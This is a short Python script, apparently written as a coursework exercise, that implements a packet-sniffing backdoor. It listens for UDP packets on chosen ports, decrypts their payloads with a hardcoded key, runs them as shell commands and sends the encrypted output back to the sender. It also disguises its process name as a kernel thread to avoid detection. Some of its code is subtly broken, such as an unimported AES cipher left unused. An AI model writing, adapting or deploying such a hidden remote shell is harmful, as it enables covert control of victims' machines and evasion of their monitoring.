import setproctitle
import os
import argparse
import platform
import subprocess
import time
import crypto
from scapy.all import *

# argument parsing
parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port from sender.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port sender is sending to.'
                   , required=True)
# parser.add_argument('-i'
#                    , '--interface'
#                    , dest='interface'
#                    , help='Interface to sniff for packets on.')
args = parser.parse_args()
sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)

def runCommand(packet):
  encryptedData = packet['Raw'].load
  decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
  data = crypto.decrypt(encryptedData)
  print "Running command " + data
  output = ""
  try:
    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
  except subprocess.CalledProcessError as e:
    output = e.output
  encryptedOutput = crypto.encrypt(output)
  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
  time.sleep(0.1)
  send(packet)

# if
def setProcessName():
  operatingSystem = platform.system()
  procName = ""
  if operatingSystem == 'Darwin':
    procName = "testtest"
  elif operatingSystem == "Linux":
    procName = "ksomethingorother"

  setproctitle.setproctitle(procName)

setProcessName()
sniff(filter=sniffFilter, prn=runCommand)